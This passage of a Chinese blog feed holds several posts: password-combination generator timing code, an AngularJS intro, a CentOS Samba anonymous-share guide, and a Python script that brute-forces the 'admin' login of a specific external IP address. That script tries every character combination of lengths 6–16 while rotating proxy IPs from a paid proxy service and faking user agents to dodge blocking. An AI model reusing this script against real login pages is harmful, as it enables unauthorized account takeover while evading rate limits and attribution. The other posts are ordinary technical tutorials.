class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;小写字母&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uppercase_letter</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    纯大写字母</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;大写字母&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_Lower_case_letters</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 小写字母</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;数字+小写字母&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_uppercase_letter</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 大写字母</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;数字+大写字母&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_z_Z</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 大写字母</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;数字+小写字母+大写字母&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 符号</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;数字+符号&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_z_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 符号</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;数字+小写字母+符号&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_Z_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 大写字母 + 符号</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) +<span class="string">&quot;位的   “&quot;</span>+<span class="string">&quot;数字+大写字母+符号&quot;</span>+ <span class="string">&quot;”  组成密码，一共 &quot;</span> +<span class="built_in">str</span>(count)+<span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_z_Z_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 大写字母 + 符号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) +<span class="string">&quot;位的   “&quot;</span>+<span class="string">&quot;数字+小写字母+大写字母+符号&quot;</span>+ <span class="string">&quot;”  组成密码，一共 &quot;</span> +<span class="built_in">str</span>(count)+<span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num_a = <span class="number">4</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 纯数字</span></span><br><span class="line">    <span class="comment"># num(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 纯小写字母</span></span><br><span class="line">    <span class="comment"># Lower_case_letters(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 纯大写字母</span></span><br><span class="line">    <span class="comment"># uppercase_letter(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数字 + 小写字母</span></span><br><span class="line">    <span class="comment"># num_Lower_case_letters(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数字 + 大写字母</span></span><br><span class="line">    <span class="comment"># num_uppercase_letter(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数字 + 小写字母 + 大写字母</span></span><br><span class="line">    <span class="comment"># num_z_Z()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数字 + 符号</span></span><br><span class="line">    <span class="comment"># num_symbol(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数字 + 小写字母 + 符号</span></span><br><span class="line">    <span class="comment"># num_z_symbol(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数字 + 大写字母 + 符号</span></span><br><span class="line">    <span class="comment"># num_Z_symbol(num_a, count)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数字 + 小写字母 + 大写字母 + 符号</span></span><br><span class="line">    <span class="comment"># num_z_Z_symbol(num_a, count)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>脚本_硬解密码_代理ip</title>
    <url>//%E8%84%9A%E6%9C%AC</url>
    <content><![CDATA[<h1 id="脚本-硬解密码-代理ip"><a href="#脚本-硬解密码-代理ip" class="headerlink" title="脚本_硬解密码__代理ip"></a>脚本_硬解密码__代理ip</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> fake_useragent <span class="comment"># https://www.cnblogs.com/guofan/p/13130477.html</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">怀疑人生ing....</span></span><br><span class="line"><span class="string">so 留个纪念</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 访问测试</span></span><br><span class="line"><span class="comment"># url = &quot;http://192.168.1.1/&quot;</span></span><br><span class="line"><span class="comment"># r = requests.get(url)</span></span><br><span class="line"><span class="comment"># print(&quot;状态码：&quot;,r)</span></span><br><span class="line"><span class="comment"># print(&quot;网页内容：&quot;,r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数装饰器 计算时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_out</span>(<span class="params">a_func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = a_func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序：&quot;</span> + a_func.__name__,<span class="string">&quot;    运行时间：&quot;</span> + <span class="built_in">str</span>(end - start))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> clocked</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip代理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_out</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://proxy.httpdaili.com/apinew.asp?sl=3&amp;noinfo=true&amp;text=1&amp;ddbh=1420927609453534893&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;代理ip状态码：&quot;</span>, r.status_code)</span><br><span class="line">    t = r.text</span><br><span class="line">    <span class="comment"># 正则匹配ip段and端口号</span></span><br><span class="line">    ips = re.findall(<span class="string">r&#x27;[0-9]+(?:\.[0-9])+.+[0-9]&#123;3&#125;&#x27;</span>, t)</span><br><span class="line">    <span class="comment"># print(ips)</span></span><br><span class="line">    proxy = &#123;<span class="string">&#x27;http&#x27;</span>: ips[<span class="number">0</span>]&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前代理ip地址为：&quot;</span>,proxy)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用加密后的密码开始登陆路由器后台</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">user,password</span>):</span></span><br><span class="line">    ip = ip_out()</span><br><span class="line">    <span class="comment"># 实例化 user-agent 对象</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    dict_1 = &#123;<span class="string">&quot;User-Agents&quot;</span>:ua.random,<span class="string">&quot;isOF&quot;</span>: <span class="number">1</span>, <span class="string">&quot;txtUserName&quot;</span>:user,<span class="string">&quot;txtPwd&quot;</span>:password&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># requests.get(&#x27;http://183.230.147.88:8081/&#x27;,proxies=ip )# headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://183.230.147.88:8081/Ajax/UserLogin.ashx&#x27;</span>,data=dict_1,proxies=ip)</span><br><span class="line"></span><br><span class="line">    code = r.text</span><br><span class="line">    <span class="keyword">if</span> code == <span class="string">&quot;password error&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登陆返回值：&#x27;</span>, code, <span class="string">&quot;密码错误，继续尝试登陆.......&quot;</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登陆返回值：&#x27;</span>, code, <span class="string">&quot;密码正确，登陆成功！！！！！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"><span class="comment"># 密码字典  生成密码</span></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_z_Z_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    time_sleep = random.random()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我认为的所有密码：</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 大写字母 + 符号</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./因为ip代理错过的密码.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">17</span>):  <span class="comment"># 密码长度  从5位数开始  16位数密码结束</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=i):</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;*************** 第 &#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; 组密码 ***************&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> login(user,password) != <span class="string">&quot;password error&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;密码破解成功，程序退出！&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    f.write(password+<span class="string">r&#x27;\n&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(password,<span class="string">&#x27;已写入...错过的密码.txt&#x27;</span>)</span><br><span class="line">                    f.close()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># if count % 50 == 0 :</span></span><br><span class="line">                <span class="comment">#     time.sleep(5)</span></span><br><span class="line">                <span class="comment">#     print(&quot;每50次尝试密码后，暂停5秒&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    user = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    <span class="comment"># 开始硬解</span></span><br><span class="line">    num_z_Z_symbol()</span><br><span class="line">    <span class="comment"># 测试ip代理</span></span><br><span class="line">    <span class="comment"># ip_out()</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>AngularJs快速入门</title>
    <url>//AngularJs</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> AngularJS是一个JavaScript框架，为了克服HTML在构建应用上的不足而设计的。<br> AngularJS通过使用我们称为标识符(directives)的结构，让浏览器能够识别新的语法。<br> AngularJS 使得开发现代的单一页面应用程序（SPAs：Single Page Applications）变得更加容易。</p>
<h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><p>AngularJS 使用 表达式 把数据绑定到 HTML。</p>
<h3 id="表达式-1"><a href="#表达式-1" class="headerlink" title="表达式"></a>表达式</h3><p>AngularJS 表达式写在双大括号内：{{ expression }} 。<br>AngularJS 表达式把数据绑定到 HTML，这与 ng-bind 指令有异曲同工之妙。<br>AngularJS 将在表达式书写的位置”输出”数据。<br>AngularJS 表达式 很像 JavaScript 表达式：它们可以包含文字、运算符和变量。<br><strong>实例：</strong>  {{ 5 + 5 }}  或 {{ firstName + " " + lastName }}</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个表达式: &#123;&#123; 5 + 5 &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>效果</strong></p>
<h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>=<span class="string">&quot;&quot;</span> <span class="attr">ng-init</span>=<span class="string">&quot;quantity=1;cost=5&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>总价： &#123;&#123; quantity * cost &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>AngularJs</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7安装配置匿名访问Samba</title>
    <url>//CentOS7-anonymous-Samba</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
<p><strong>Samba</strong>，是种用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协议做链接的自由软件   –wikipedia</p>
</blockquote>
<p>本文就以 CentOS7 搭建 Samba 匿名完全访问（读/写）为目标，实现一个局域网内的文件共享平台。</p>
<h2 id="1-安装Samba服务"><a href="#1-安装Samba服务" class="headerlink" title="1.安装Samba服务"></a>1.安装Samba服务</h2><p>使用 yum 工具进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yum install samba samba-client</span><br></pre></td></tr></table></figure>

<h2 id="2-检查是否安装成功"><a href="#2-检查是否安装成功" class="headerlink" title="2.检查是否安装成功"></a>2.检查是否安装成功</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ rpm -qa | grep samba</span><br></pre></td></tr></table></figure>

<h2 id="3-防火墙开放端口"><a href="#3-防火墙开放端口" class="headerlink" title="3.防火墙开放端口"></a>3.防火墙开放端口</h2><p>在 <code>/etc/sysconfig/iptables</code> 中添加配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 137 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 138 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 139 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 389 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 445 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 901 -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>重启 iptables 服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ service iptables restart</span><br></pre></td></tr></table></figure>
<p>设置开机自启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chkconfig --level 35 smb on</span><br></pre></td></tr></table></figure>

<h2 id="4-共享配置"><a href="#4-共享配置" class="headerlink" title="4.共享配置"></a>4.共享配置</h2><p>Samba Server的验证方式有四种：</p>
<ul>
<li>share：匿名访问共享，不需要提供用户名和口令, 安全性能较低。</li>
<li>user：共享目录只能被授权的用户访问,由Samba Server负责检查账号和密码的正确性。账号和密码要在本Samba Server中建立。</li>
<li>server：依靠其他Windows Server或Samba Server来验证用户的账号和密码,是一种代理验证。此种安全模式下,系统管理员可以把所有的Windows用户和口令集中到一个Server系统上,使用 Windows Server进行Samba认证, 远程服务器可以自动认证全部用户和口令,如果认证失败,Samba将使用用户级安全模式作为替代的方式。</li>
<li>domain：域安全级别,使用主域控制器(PDC)来完成认证。</li>
</ul>
<blockquote>
<p>创建一个匿名共享访问，需要使用share模式，但在CentOS安装的samba4中share 和 server验证方式已被弃用</p>
</blockquote>
<p>配置如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">        workgroup = MYGROUP</span><br><span class="line">        server string = Samba Server Version %v</span><br><span class="line">        log file = /var/log/samba/log.%m</span><br><span class="line">        max log size = 50</span><br><span class="line">        security = user</span><br><span class="line">        map to guest = Bad User</span><br><span class="line">        load printers = yes</span><br><span class="line">        cups options = raw</span><br><span class="line">[share]</span><br><span class="line">        comment = share</span><br><span class="line">        path = /home/samba</span><br><span class="line">      	directory mask = 0777</span><br><span class="line">      	create mask = 0777</span><br><span class="line">      	#不可视目录</span><br><span class="line">        #browseable = yes</span><br><span class="line">        guest ok=yes</span><br><span class="line">        writable=yes</span><br></pre></td></tr></table></figure>

<p>创建 <code>/home/samba</code> 共享目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir /home/samba</span><br></pre></td></tr></table></figure>

<p>重启 smb 服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ service smb restart</span><br></pre></td></tr></table></figure>

<p>检查服务是否在运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pgrep smbd</span><br></pre></td></tr></table></figure>


<p>检查配置参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ testparm</span><br><span class="line">Load smb config files from /etc/samba/smb.conf</span><br><span class="line">Processing section <span class="string">&quot;[share]&quot;</span></span><br><span class="line">Loaded services file OK.</span><br><span class="line">Server role: ROLE_STANDALONE</span><br><span class="line"></span><br><span class="line">Press enter to see a dump of your service definitions</span><br><span class="line"></span><br><span class="line"><span class="comment"># Global parameters</span></span><br><span class="line">[global]</span><br><span class="line">	server string = Samba Server Version %v</span><br><span class="line">	workgroup = MYGROUP</span><br><span class="line">	<span class="built_in">log</span> file = /var/<span class="built_in">log</span>/samba/<span class="built_in">log</span>.%m</span><br><span class="line">	max <span class="built_in">log</span> size = 50</span><br><span class="line">	map to guest = Bad User</span><br><span class="line">	security = USER</span><br><span class="line">	idmap config * : backend = tdb</span><br><span class="line">	cups options = raw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[share]</span><br><span class="line">	comment = share</span><br><span class="line">	path = /home/samba</span><br><span class="line">	create mask = 0777</span><br><span class="line">	directory mask = 0777</span><br><span class="line">	guest ok = Yes</span><br><span class="line">	<span class="built_in">read</span> only = No</span><br></pre></td></tr></table></figure>

<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>以上就配置完成，如服务器地址为192.168.0.87</p>
<p>windows 系统访问，直接运行 <code>\\192.168.0.87\share</code></p>
<p>linux 系统访问， <code>smb://192.168.0.87/share</code></p>
